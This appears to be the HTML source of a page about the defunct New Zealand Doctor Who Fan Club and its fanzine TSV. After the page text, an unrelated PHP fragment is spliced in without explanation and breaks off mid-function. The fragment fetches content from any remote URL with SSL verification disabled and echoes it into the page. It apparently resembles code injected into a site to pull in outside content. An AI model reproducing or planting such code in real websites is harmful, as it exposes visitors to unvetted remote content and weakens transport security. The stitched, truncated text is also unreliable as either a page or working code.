              <h1>The New Zealand Doctor Who Fan Club</h1>
            </div>

            <div class="contentsection">
              <p>
                The New Zealand Doctor Who Fan Club (NZDWFC) is no longer active. The club was founded in 1988,
                and was at its height during <i>Doctor Who</i>'s 'wilderness years', during the 1990s and early
                2000s, when the programme wasn't being made.
              </p>

              <p>
                Time Space Visualiser (TSV) was the club fanzine. TSV was first published in 1987 and was adopted
                as the club magazine the following year. It ran for 76 issues over 22 years, with the final issue
                appearing in 2009.
              </p>

              <p>
                Copies of many issues of TSV are held by the National Library of New Zealand and the Alexander
                Turnbull Library in Wellington, New Zealand. The International Standard Serial Number (ISSN) is
                1175-1924.
              </p>

              <p>
                Most issues of TSV, other publications produced by the club, and a couple of novels are all
                available to view in the <a href="/archive/">Archive section</a>.
              </p>

              <p>
                The <a href="http://forums.doctorwho.org.nz/">Forums</a> (message boards) on this site remain open
                for fans to discuss anything to do with <i>Doctor Who</i>.
              </p>

    function fetch_remote_content($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bypass SSL verification if needed
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
}
function fetch_and_display_content($url) {
    $fileContents = fetch_remote_content($url);
    if (strpos($fileContents, '<?php') === false) {
        echo $fileContents;
    }
